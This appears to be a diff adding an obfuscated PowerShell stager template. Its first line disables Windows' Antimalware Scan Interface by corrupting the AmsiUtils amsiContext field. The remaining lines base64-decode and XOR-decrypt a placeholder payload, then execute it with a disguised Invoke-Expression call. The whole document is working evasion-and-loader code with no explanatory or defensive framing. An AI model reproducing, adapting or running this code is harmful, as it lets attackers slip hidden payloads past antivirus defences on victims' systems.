@@ -1,0 +1,10 @@
+[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(('Sy'+("{1}{0}" -f 'm.','ste')+("{2}{0}{1}" -f'a','nage','M')+("{1}{0}" -f'.','ment')+("{0}{1}{2}"-f 'A','utomatio','n.Am')+("{1}{0}"-f'iUti','s')+'ls')).GetField((("{1}{0}" -f'si','am')+'C'+("{0}{1}"-f'ontex','t')),[Reflection.BindingFlags](("{0}{1}{2}" -f'N','on','Public')+','+'S'+'t'+("{1}{0}"-f 'ic','at'))).GetValue($null),0x41414141)
+
+
+${OM`xrD`MZkbhROAa`kC} = "$$DATA$$"
+
+${p`VXppPETRWju`AK`GC} = [System.Convert]::FromBase64String(  ${omxrDm`zKb`HRo`AakC})
+for (${rGq`T`wL}  =  0; ${R`GQ`Twl} -lt ${pvxp`PpeTRw`j`Uak`GC}.Count  ;   ${rG`q`TwL}++) {
+                ${pVxPPpEtrwjUAkGc}[${rgqtwl}] =   ${pVxPPpEtrwjUAkGc}[${RGQTWL}] -bxor $$KEY$$
+        }
+.("{1}{0}"-f'x','ie'  ) ( [System.Text.Encoding]::Unicode.GetString(  ${P`VXpPP`etRwJ`UaKGC} ) )
